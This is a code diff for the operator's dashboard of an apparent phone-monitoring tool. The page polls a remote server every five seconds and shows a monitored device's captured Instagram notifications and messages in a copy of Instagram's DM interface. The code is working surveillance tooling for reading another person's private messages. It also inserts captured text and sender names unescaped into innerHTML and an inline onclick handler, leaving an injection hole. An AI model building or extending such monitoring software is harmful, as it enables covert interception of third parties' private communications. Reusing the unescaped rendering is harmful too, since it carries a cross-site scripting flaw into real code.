@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Instagram DM</title>
+    <title>Instagram DM Monitor</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         /* --- INSTAGRAM DARK THEME --- */
@@ -21,10 +21,9 @@
         .app-container {
             width: 100%;
             height: 100%;
-            max-width: 450px; /* Desktop View fix */
+            max-width: 450px;
             background-color: #000;
             position: relative;
-            box-shadow: 0 0 20px rgba(255,255,255,0.1);
             display: flex;
             flex-direction: column;
         }
@@ -33,20 +32,14 @@
         #dmListView { display: flex; flex-direction: column; height: 100%; width: 100%; }
 
         .dm-header { 
-            padding: 15px; 
-            display: flex; 
-            justify-content: space-between; 
-            align-items: center; 
-            height: 40px;
+            padding: 15px; display: flex; justify-content: space-between; align-items: center; height: 40px;
         }
         .username-top { font-weight: bold; font-size: 1.2rem; display: flex; align-items: center; gap: 5px; cursor: pointer; }
         .header-icons { display: flex; gap: 20px; font-size: 1.4rem; }
         
-        /* Search Bar Style */
         .search-box { padding: 0 15px 10px 15px; }
         .search-input { width: 100%; background: #262626; border: none; padding: 8px 10px; border-radius: 10px; color: #a8a8a8; outline: none; box-sizing: border-box; }
 
-        /* List Styling */
         .dm-list { flex: 1; overflow-y: auto; padding-top: 5px; }
         
         .dm-item { 
@@ -55,11 +48,10 @@
         .dm-item:active { background: #1a1a1a; }
 
         .insta-dp { width: 54px; height: 54px; border-radius: 50%; background: #333; margin-right: 15px; overflow: hidden; display: flex; justify-content: center; align-items: center; font-size: 1.5rem; color: #888; border: 1px solid #333; }
-        .insta-dp img { width: 100%; height: 100%; object-fit: cover; }
         
         .dm-info { flex: 1; }
         .dm-info h4 { margin: 0; font-weight: 400; font-size: 0.95rem; color: #fff; }
-        .dm-info p { margin: 3px 0 0; color: #a8a8a8; font-size: 0.85rem; }
+        .dm-info p { margin: 3px 0 0; color: #a8a8a8; font-size: 0.85rem; display: -webkit-box; -webkit-line-clamp: 1; -webkit-box-orient: vertical; overflow: hidden;}
         
         .camera-icon { margin-left: auto; color: #a8a8a8; font-size: 1.4rem; }
 
@@ -84,21 +76,10 @@
         
         .msg { padding: 10px 16px; border-radius: 22px; max-width: 70%; font-size: 0.95rem; margin-bottom: 2px; line-height: 1.4; word-wrap: break-word;}
         
-        /* Message Bubbles */
         .msg-in { 
-            background: #262626; 
-            align-self: flex-start; 
-            color: #fff; 
-            border-bottom-left-radius: 5px;
+            background: #262626; align-self: flex-start; color: #fff; border-bottom-left-radius: 5px;
         }
-        .msg-out { 
-            background: linear-gradient(to right, #3797f0, #0064e0); 
-            align-self: flex-end; 
-            color: #fff; 
-            border-bottom-right-radius: 5px;
-        }
-        .msg-out.last { border-bottom-right-radius: 22px; }
-        .msg-in.last { border-bottom-left-radius: 22px; }
+        .msg-time { font-size: 0.65rem; color: #888; display: block; margin-top: 5px; text-align: right;}
 
         .chat-input { padding: 15px; display: flex; align-items: center; gap: 15px; }
         .pill { flex: 1; background: #262626; padding: 12px 20px; border-radius: 25px; color: #fff; border: 1px solid #333; display: flex; justify-content: space-between; align-items: center; }
@@ -112,7 +93,7 @@
         <div id="dmListView">
             <div class="dm-header">
                 <div class="username-top">
-                    <span id="myUsername">my_profile</span> 
+                    <span id="myUsername">instagram_user</span> 
                     <i class="fa-solid fa-chevron-down" style="font-size:0.7rem; margin-left: 5px;"></i>
                 </div>
                 <div class="header-icons">
@@ -126,7 +107,8 @@
             </div>
 
             <div class="dm-list" id="instaList">
-                </div>
+                <p style="text-align:center; padding-top:20px; color:#555">Loading Messages...</p>
+            </div>
         </div>
 
         <div id="chatView">
@@ -137,14 +119,14 @@
                 </div>
                 <div style="flex:1;">
                     <div style="font-weight:600; font-size: 0.95rem;" id="instaChatName">User</div>
-                    <div style="font-size: 0.75rem; color: #a8a8a8;">Active 1h ago</div>
+                    <div style="font-size: 0.75rem; color: #a8a8a8;">Active today</div>
                 </div>
                 <i class="fa-solid fa-phone" style="font-size:1.4rem; margin-right:20px"></i>
                 <i class="fa-solid fa-video" style="font-size:1.4rem"></i>
             </div>
             
             <div class="chat-area" id="instaMsgs">
-                </div>
+            </div>
             
             <div class="chat-input">
                 <div class="pill">
@@ -157,104 +139,140 @@
     </div>
 
     <script>
-        // --- MULTI-USER ID LOGIC ---
+        // --- LOGIC START ---
 
-        // 1. Dashboard ID Retrieve
         const DEVICE_ID = localStorage.getItem('monitoring_id');
+        const SERVER_URL = "https://child-v9no.onrender.com/api/get_data";
 
-        // Security Check
         if (!DEVICE_ID) {
-            alert("Security Alert: No Device ID Found.");
+            alert("Device ID Missing!");
             window.location.href = 'index.html'; 
         }
 
-        // 2. Dynamic Key
-        const STORAGE_KEY = `instagram_data_${DEVICE_ID}`;
+        let groupedInsta = {}; // Data store
 
-        // 3. Data Loading
-        let storedData = localStorage.getItem(STORAGE_KEY);
-        let instaData = [];
+        // 1. Data Fetching
+        async function fetchInstaData() {
+            try {
+                const response = await fetch(`${SERVER_URL}?device_id=${DEVICE_ID}&type=chat_logs`);
+                const result = await response.json();
 
-        if (storedData) {
-            instaData = JSON.parse(storedData);
-        } else {
-            // --- DUMMY DATA FOR TESTING ---
-            console.log(`Generating Insta data for ID: ${DEVICE_ID}`);
-            instaData = [
-                { 
-                    id: 1, name: "priya_sharma", last: "Sent a reel by you", 
-                    msgs: [
-                        {side:'in', text:'Look at this reel!'}, 
-                        {side:'out', text:'Hahaha lol 😂'},
-                        {side:'in', text:'Device ID check: ' + DEVICE_ID}
-                    ] 
-                },
-                { 
-                    id: 2, name: "cool_boy_99", last: "Active 1h ago", 
-                    msgs: [
-                        {side:'in', text:'Bro kaha hai?'},
-                        {side:'out', text:'Gym me hu'},
-                        {side:'in', text:'Aa ja jaldi'}
-                    ] 
-                },
-                {
-                    id: 3, name: "unknown_user", last: "Seen 2h ago",
-                    msgs: [{side:'in', text:'Hello?'}]
+                if (result.status === 'success' && result.data) {
+                    processInstaData(result.data);
                 }
-            ];
-            // Save dummy data
-            localStorage.setItem(STORAGE_KEY, JSON.stringify(instaData));
+            } catch (error) {
+                console.error("Error:", error);
+                document.getElementById('instaList').innerHTML = "<p style='text-align:center; color:#555'>Connection Failed</p>";
+            }
         }
 
-        // --- RENDER LOGIC ---
+        // 2. Data Processing (The Brain)
+        function processInstaData(logs) {
+            groupedInsta = {}; // Clear old data
 
-        function renderInsta() {
+            logs.forEach(log => {
+                if (log.app === 'Instagram') {
+                    
+                    let sender = log.title || ""; 
+                    let messageContent = log.text || "";
+
+                    // --- INTELLIGENT NAME CLEANING ---
+                    // Kabhi kabhi "title" Instagram hota hai aur "text" naam hota hai (Jaise aapke data mein hai)
+                    
+                    if (sender === "Instagram" && !messageContent.includes(" ")) {
+                        // Agar title Instagram hai aur message mein koi space nahi hai -> Matlab ye username hai
+                        sender = messageContent;
+                        messageContent = "[New Notification]"; // Placeholder
+                    } else if (sender === "Instagram") {
+                        // Agar title Instagram hai aur text lamba hai -> General Notification
+                        sender = "Notifications";
+                    } else if (!sender) {
+                        // Agar title gayab hai, text ko username maan lo (Fallback)
+                        if(!messageContent.includes(" ")) {
+                            sender = messageContent;
+                            messageContent = "Tap to view";
+                        } else {
+                            sender = "Unknown";
+                        }
+                    }
+
+                    // --- GROUPING ---
+                    if (!groupedInsta[sender]) {
+                        groupedInsta[sender] = {
+                            name: sender,
+                            lastMsg: messageContent,
+                            timestamp: log.timestamp,
+                            msgs: []
+                        };
+                    }
+
+                    // Add Message
+                    groupedInsta[sender].msgs.push({
+                        text: messageContent,
+                        time: new Date(log.timestamp).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}),
+                        fullTime: log.timestamp
+                    });
+
+                    // Update Last Message preview
+                    groupedInsta[sender].lastMsg = messageContent;
+                }
+            });
+
+            renderInstaList();
+        }
+
+        // 3. Render List
+        function renderInstaList() {
             const list = document.getElementById('instaList');
             list.innerHTML = "";
-            
-            if(instaData.length === 0) {
-                list.innerHTML = "<p style='text-align:center; color:#555; margin-top:20px'>No Messages</p>";
+            const users = Object.keys(groupedInsta);
+
+            if(users.length === 0) {
+                list.innerHTML = "<p style='text-align:center; color:#555; margin-top:20px'>No Instagram DMs found</p>";
                 return;
             }
 
-            instaData.forEach(u => {
-                // Determine if last message was sent by us (for 'Sent' text)
-                let lastMsgText = u.last;
+            users.forEach(user => {
+                const u = groupedInsta[user];
                 
+                // Avatar Logic: "Notifications" ke liye alag icon
+                let icon = '<i class="fa-solid fa-user"></i>';
+                if(user === "Notifications") icon = '<i class="fa-solid fa-bell"></i>';
+
                 list.innerHTML += `
-                    <div class="dm-item" onclick="openInstaChat(${u.id})">
-                        <div class="insta-dp"><i class="fa-solid fa-user"></i></div>
+                    <div class="dm-item" onclick="openInstaChat('${user}')">
+                        <div class="insta-dp">${icon}</div>
                         <div class="dm-info">
                             <h4>${u.name}</h4>
-                            <p>${lastMsgText}</p>
+                            <p>${u.lastMsg}</p>
                         </div>
                         <i class="fa-solid fa-camera camera-icon"></i>
                     </div>`;
             });
         }
 
-        function openInstaChat(id) {
-            const u = instaData.find(x => x.id === id);
+        // 4. Open Chat
+        function openInstaChat(userName) {
+            const u = groupedInsta[userName];
             
             if(u) {
                 document.getElementById('instaChatName').innerText = u.name;
                 const box = document.getElementById('instaMsgs');
                 box.innerHTML = "";
                 
-                // Add Messages
-                u.msgs.forEach((m, index) => {
-                    let isLast = index === u.msgs.length - 1;
-                    let lastClass = isLast ? 'last' : '';
-                    let msgClass = m.side === 'out' ? 'msg-out' : 'msg-in';
-                    
-                    box.innerHTML += `<div class="msg ${msgClass} ${lastClass}">${m.text}</div>`;
+                // Sort messages
+                u.msgs.sort((a,b) => a.fullTime - b.fullTime);
+
+                u.msgs.forEach(m => {
+                    box.innerHTML += `
+                        <div class="msg msg-in">
+                            ${m.text}
+                            <span class="msg-time">${m.time}</span>
+                        </div>`;
                 });
 
-                // Switch View
                 document.getElementById('dmListView').style.display = 'none';
                 document.getElementById('chatView').style.display = 'flex';
-                
-                // Scroll bottom
                 box.scrollTop = box.scrollHeight;
             }
         }
@@ -264,8 +282,9 @@
             document.getElementById('dmListView').style.display = 'flex';
         }
 
-        // Initialize
-        renderInsta();
+        // Auto Refresh every 5 seconds
+        fetchInstaData();
+        setInterval(fetchInstaData, 5000);
 
     </script>
 </body>
